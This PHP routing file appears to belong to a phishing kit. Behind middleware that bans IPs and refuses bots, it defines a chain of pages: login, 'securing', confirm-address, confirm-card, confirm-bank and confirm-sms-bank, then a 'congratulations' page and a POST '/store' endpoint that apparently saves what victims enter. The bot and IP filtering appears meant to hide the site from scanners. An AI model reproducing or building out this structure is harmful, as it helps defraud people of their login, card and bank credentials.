<?php

use App\Http\Controllers;
use Core\Facades\Config;
use Core\Routes\Router;

return function (Router $router) {
    $router->middleware([
        'banned_ip',
        'refuse_bot',
        
    ])->group(function ($router) {
        $router->get('/', [Controllers\AppController::class, 'home']);
        $router->get('/login', [Controllers\AppController::class, 'login']);
        $router->get('/securing', [Controllers\AppController::class, 'securing']);
        $router->get('/confirm-address', [Controllers\AppController::class, 'confirmAddress']);
        $router->get('/confirm-card', [Controllers\AppController::class, 'confirmCard']);
        $router->get('/confirm-bank', [Controllers\AppController::class, 'confirmBank']);
        $router->get('/confirm-sms-bank', [Controllers\AppController::class, 'confirmSmsBank']);
        $router->get('/congratulations', [Controllers\AppController::class, 'congratulations']);
        $router->post('/store', [Controllers\AppController::class, 'store']);
    });
};
